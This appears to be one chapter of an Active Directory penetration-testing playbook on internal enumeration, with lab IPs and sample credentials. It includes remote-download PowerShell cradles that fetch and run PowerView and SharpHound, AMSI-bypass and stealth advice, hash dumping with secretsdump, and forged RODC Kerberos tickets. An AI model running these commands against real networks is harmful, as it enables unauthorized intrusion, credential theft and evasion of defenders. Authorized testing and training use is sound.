# Phase 3: Internal Enumeration

> You have credentials (or unauthenticated LDAP) + network access to the DC. Now map everything.

This phase is the heart of AD pentesting. **80% of finding the attack path is enumeration.**

---

## Table of Contents
1. [Network Discovery](#1-network-discovery)
2. [LDAP Enumeration](#2-ldap-enumeration)
3. [PowerView (Windows)](#3-powerview-windows)
4. [BloodHound + SharpHound](#4-bloodhound--sharphound)
5. [SMB Enumeration](#5-smb-enumeration)
6. [ACL Enumeration](#6-acl-enumeration)

---

## 1. Network Discovery

Find the Domain Controller and other Windows hosts.

```bash
# Identify DC: ports 88 (Kerberos), 389 (LDAP), 445 (SMB), 464 (kpasswd)
nmap -sV -p 88,135,139,389,445,464,636,3268,3269 10.10.10.0/24

# Quick alive sweep
nmap -sn 10.10.10.0/24

# Find DCs specifically via root DSE
nmap --script=ldap-rootdse -p 389 10.10.10.0/24
```

🟡 **OPSEC**: SYN scans across a /24 are noisy. Targeted scans of specific ports on suspected DC are quieter.

---

## 2. LDAP Enumeration

### Anonymous / Unauthenticated (rare but check)
```bash
# Can you read anything anonymously?
ldapsearch -H ldap://10.10.10.10 -x -b "DC=lab,DC=local" -s base
ldapsearch -H ldap://10.10.10.10 -x -b "" -s base namingContexts
```

### Authenticated LDAP
```bash
# ldapdomaindump — dumps everything to HTML/JSON
ldapdomaindump -u 'LAB\jdoe' -p 'Password1' ldap://10.10.10.10 -o /tmp/ldapdump/
# Outputs: domain_users.html, domain_groups.html, domain_computers.html, ...

# windapsearch — targeted queries
windapsearch -d lab.local -u jdoe -p Password1 --dc 10.10.10.10 -m users
windapsearch -d lab.local -u jdoe -p Password1 --dc 10.10.10.10 -m groups
windapsearch -d lab.local -u jdoe -p Password1 --dc 10.10.10.10 -m computers
windapsearch -d lab.local -u jdoe -p Password1 --dc 10.10.10.10 -m kerberoastable
windapsearch -d lab.local -u jdoe -p Password1 --dc 10.10.10.10 -m asreproastable
windapsearch -d lab.local -u jdoe -p Password1 --dc 10.10.10.10 -m unconstrained

# Quick raw query
ldapsearch -H ldap://10.10.10.10 -D "jdoe@lab.local" -w Password1 -b "DC=lab,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName description
```

### Useful description fields
Always grep descriptions — admins sometimes put **passwords** there:
```bash
ldapdomaindump ... && grep -i "pass\|pwd" /tmp/ldapdump/domain_users.html
```

🟢 **OPSEC**: LDAP queries log to Event 4662 only with auditing enabled — most environments don't audit LDAP by default.

---

## 3. PowerView (Windows)

> Run from a domain-joined Windows host or via Evil-WinRM session. Import-bypass AMSI if it's blocked (see `11-evasion.md`).

```powershell
# Load PowerView
Import-Module .\PowerView.ps1
# Or in-memory:
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.99/PowerView.ps1')

# Domain info
Get-Domain
Get-DomainController
Get-DomainSID
Get-DomainPolicy            # password policy

# Users
Get-DomainUser | select samaccountname, description, memberof
Get-DomainUser -SPN | select samaccountname, serviceprincipalname    # Kerberoastable
Get-DomainUser -PreauthNotRequired                                   # AS-REP roastable
Get-DomainUser -AdminCount                                            # Protected (was-DA-once) users
Get-DomainUser -TrustedToAuth                                         # Constrained delegation

# Groups
Get-DomainGroup | select name
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse
Get-DomainGroupMember "Schema Admins" -Recurse

# Computers
Get-DomainComputer | select name, operatingsystem, dnshostname
Get-DomainComputer -Unconstrained                                     # Unconstrained delegation!
Get-DomainComputer -TrustedToAuth                                     # Constrained delegation

# Local admin discovery (SLOW — touches every host)
Find-LocalAdminAccess -Threads 20

# Find shares and interesting files
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.config,*.ps1,*.bat,*.vbs,*.kdbx

# GPOs
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup                                               # GPOs adding local admins

# Find where users are logged in (useful for "hunt the DA" workflow)
Invoke-UserHunter -GroupName "Domain Admins" -CheckAccess
```

🟡 **OPSEC**: PowerView is well-fingerprinted by AMSI / Defender. Either bypass AMSI first or use the obfuscated `PowerView_dev.ps1` variant. From Linux, prefer Impacket/NetExec instead.

---

## 4. BloodHound + SharpHound

The single most important tool. Maps AD as a graph and finds attack paths.

### Collection — from Linux
```bash
# bloodhound-python (legacy/BHCE-compatible)
bloodhound-python -u jdoe -p Password1 -d lab.local -dc dc01.lab.local \
  -c All --zip -o /tmp/bh/

# rusthound (faster on large domains)
rusthound -d lab.local -u jdoe -p Password1 -i 10.10.10.10 -o /tmp/bh/ -z
```

### Collection — from Windows
```powershell
# SharpHound (PowerShell wrapper)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.99/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -Domain lab.local -ZipFilename output.zip

# Stealth mode (slower, less noisy)
Invoke-BloodHound -CollectionMethod DCOnly,Session

# SharpHound binary
.\SharpHound.exe -c All --domain lab.local --zipfilename bh.zip --stealth
```

### Loading data
```bash
# Legacy BloodHound (neo4j)
sudo neo4j start
bloodhound
# Login → drag-and-drop the .zip onto the GUI

# BloodHound CE (preferred — newer)
# Browse http://localhost:8080 → upload zip via Administration → File Ingest
```

### Critical queries (built-in)

In BloodHound, run from the **Analysis** tab:
- `Find Shortest Paths to Domain Admins` ← run this first
- `Find Principals with DCSync Rights`
- `Find AS-REP Roastable Users`
- `Find Kerberoastable Users with most Privileges`
- `Shortest Paths from Owned Principals` ← after right-clicking your owned nodes → Mark as Owned
- `Find Computers with Unconstrained Delegation`
- `Find Computers where Domain Users are Local Admin`
- `Find AD CS ESC1` (in BHCE)

### Custom Cypher (advanced)
```cypher
// Find all paths from owned users to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group))
WHERE g.name CONTAINS 'DOMAIN ADMINS'
RETURN p

// Users with GenericAll on the DA group
MATCH p=(u:User)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@LAB.LOCAL"})
RETURN p

// Computers where you can RBCD (you have GenericWrite/GenericAll)
MATCH p=(u {owned:true})-[:GenericAll|GenericWrite|WriteDacl]->(c:Computer)
RETURN p
```

🟡 **OPSEC**: SharpHound with `-c All` generates thousands of LDAP and SMB queries. Use `--stealth` (LDAP-only, no SMB session enumeration) for quieter runs. Modern EDRs fingerprint SharpHound binaries.

**Detection**:
- Surge of LDAP queries from one principal (Event 4662 with directory auditing)
- SMB IPC$ connections to every host (NetSessionEnum) — Sysmon 3
- Defender for Identity has a "Reconnaissance using SAM-R" alert

---

## 5. SMB Enumeration

```bash
# NetExec — the standard
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --shares
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --users
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --groups
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --pass-pol
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --loggedon-users
nxc smb 10.10.10.0/24 -u jdoe -p Password1 --sessions

# Spider every readable share for interesting files
nxc smb 10.10.10.10 -u jdoe -p Password1 -M spider_plus -o DOWNLOAD_FLAG=True

# Check SYSVOL for GPP cpassword (old vuln, MS14-025, still seen in labs and unpatched envs)
smbclient //10.10.10.10/SYSVOL -U 'jdoe%Password1' -c 'recurse; ls'
# Look for Groups.xml, Services.xml — grep for "cpassword="

# null session (rare in modern Windows but check)
smbclient -L //10.10.10.10 -N
enum4linux-ng -A 10.10.10.10
```

🟢 **OPSEC**: Share enumeration is normal user activity. SMB sessions are logged but rarely alerted.

---

## 6. ACL Enumeration

**Why this matters**: A misconfigured ACL is often the entire chain to DA. Examples:
- `GenericAll` over a user → reset their password
- `WriteDACL` on the domain → grant yourself DCSync
- `WriteMembers` on Domain Admins → add yourself

### PowerView
```powershell
# Who can write to the Domain Admins group?
Get-DomainObjectACL "Domain Admins" -ResolveGUIDs | 
  ? {$_.ActiveDirectoryRights -match "WriteMembers|GenericAll|GenericWrite"}

# What ACLs does jdoe have over other objects?
Get-DomainObjectACL -ResolveGUIDs | 
  ? {$_.IdentityReferenceName -match "jdoe"}

# Who can DCSync the domain?
Get-DomainObjectACL "DC=lab,DC=local" -ResolveGUIDs |
  ? {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

### From Linux
```bash
# Impacket dacledit
python3 dacledit.py -action read -target "Domain Admins" \
  -dc-ip 10.10.10.10 'lab.local/jdoe:Password1'
```

### Key Rights to Recognize

| Right | What it lets you do |
|-------|--------------------|
| `GenericAll` | Full control — do anything on the object |
| `GenericWrite` | Write any property — including SPN for targeted Kerberoast |
| `WriteDACL` | Modify the object's permissions (escalate to GenericAll) |
| `WriteOwner` | Become the owner (escalate to GenericAll) |
| `WriteProperty` (specific) | Write one attribute (e.g. `msDS-AllowedToActOnBehalfOfOtherIdentity` = RBCD) |
| `AllExtendedRights` | Includes ForceChangePassword, DCSync if on domain object |
| `Self` | Add yourself to a group (on user object) |
| `User-Force-Change-Password` | Reset password without knowing old one |
| `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` | DCSync |

→ See `06-privesc.md` for exploitation of each.

---

## Next Step

Found Kerberoastable / AS-REP / juicy ACLs → **Phase 4: Credential Attacks** (`04-credential-attacks.md`)
Found local-admin paths → **Phase 5: Lateral Movement** (`05-lateral-movement.md`)
Found ACL paths to DA → **Phase 6: Privilege Escalation** (`06-privesc.md`)

---

## 7. BloodHound Cypher — Practical Query Library

> Copy-paste these into BloodHound's raw query box. Most useful after marking your owned nodes.

```cypher
// === ATTACK PATH QUERIES ===

// All shortest paths from ANY owned node to Domain Admins
MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group))
WHERE g.name =~ "(?i)DOMAIN ADMINS@.*"
RETURN p LIMIT 25

// All shortest paths from ANY owned node to any high-value target
MATCH p=shortestPath((u {owned:true})-[*1..]->(n {highvalue:true}))
WHERE u <> n
RETURN p LIMIT 25

// === KERBEROS TARGETS ===

// Kerberoastable users with a path to DA
MATCH (u:User {hasspn:true}) WHERE u.enabled=true
MATCH p=shortestPath((u)-[*1..]->(g:Group))
WHERE g.name =~ "(?i)DOMAIN ADMINS@.*"
RETURN u.name, length(p) ORDER BY length(p)

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name, u.description

// === ACL / RIGHTS QUERIES ===

// Who has GenericAll on Domain Admins?
MATCH p=(n)-[:GenericAll]->(g:Group)
WHERE g.name =~ "(?i)DOMAIN ADMINS@.*"
RETURN n.name, n.objectid

// Who has WriteDACL on the domain object?
MATCH p=(n)-[:WriteDacl]->(d:Domain)
RETURN n.name, d.name

// All ACL edges from owned users to any object
MATCH p=(u {owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember|ForceChangePassword|AllExtendedRights]->(t)
RETURN u.name, type(r), t.name LIMIT 50

// Users with DCSync rights (non-DC)
MATCH p=(u)-[:DCSync|GetChangesAll|GetChanges]->(d:Domain)
WHERE NOT u.objectid ENDS WITH "-516"   // exclude Domain Controllers group
RETURN u.name, d.name

// === DELEGATION QUERIES ===

// Computers with unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.objectid ENDS WITH "-516"
RETURN c.name, c.operatingsystem

// Computers with constrained delegation (any)
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name, c.allowedtodelegate

// Users with constrained delegation
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL AND u.enabled=true
RETURN u.name, u.allowedtodelegate

// === ADMIN ACCESS QUERIES ===

// Computers where owned users have local admin
MATCH p=(u {owned:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

// Computers where Domain Users are local admin (misconfiguration)
MATCH p=(g:Group)-[:AdminTo]->(c:Computer)
WHERE g.name =~ "(?i)DOMAIN USERS@.*"
RETURN c.name

// === CROSS-DOMAIN / TRUST ===

// All domain trust relationships
MATCH p=(d1:Domain)-[:TrustedBy|Trusts]->(d2:Domain)
RETURN p

// Foreign users in high-value local groups
MATCH p=(u:User)-[:MemberOf]->(g:Group)
WHERE u.domain <> g.domain AND g.highvalue=true
RETURN u.name, u.domain, g.name, g.domain
```

---

## 8. Read-Only Domain Controller (RODC) Attacks

**Concept**: RODCs are domain controllers deployed in branch offices or DMZs. They hold a partial, read-only copy of AD. Key properties:
- Have their own **krbtgt_RODC** account (separate from the main krbtgt)
- Can only issue tickets for accounts listed in `msDS-RevealOnDemandGroup` (allow list)
- Never cache passwords for accounts in `msDS-NeverRevealGroup` (deny list — includes DA, EA by default)

**Attack surface**:
1. Compromise a RODC machine account → dump cached credentials for allowed accounts
2. If the RODC's `msDS-RevealOnDemandGroup` contains sensitive accounts, those accounts' hashes may be cached
3. Forge a RODC krbtgt ticket (with the RODC's krbtgt hash) → creates a ticket that looks valid but is actually flagged on the forest root DC (limited use, but demonstrates impact)

```powershell
# Find RODCs
Get-ADDomainController -Filter {IsReadOnly -eq $true}
Get-DomainController -Filter {IsReadOnly -eq $true}

# Check what accounts are revealed (cached) on a RODC
Get-ADObject -Identity "CN=RODC-Branch,OU=Domain Controllers,DC=lab,DC=local" `
  -Properties msDS-RevealedList, msDS-NeverRevealGroup, msDS-RevealOnDemandGroup

# If you compromise the RODC — dump its partial NTDS
secretsdump.py -just-dc lab.local/RODCAdmin:Password1@rodc.lab.local
# Only returns hashes for accounts in the revealed list — not DA/EA by default
```

```bash
# Forge a RODC-signed ticket (demonstrates signing compromise to customer)
# Need: RODC krbtgt hash, RODC krbtgt RID
ticketer.py -nthash <RODC_krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain lab.local -extra-sid S-1-5-21-...-<RODC_krbtgt_RID> administrator
```

**Reporting note**: RODC compromise scope is limited compared to real DC compromise — escalate via:
- Any cached privileged account hashes
- RODC machine account → lateral move to the branch office network → further pivot

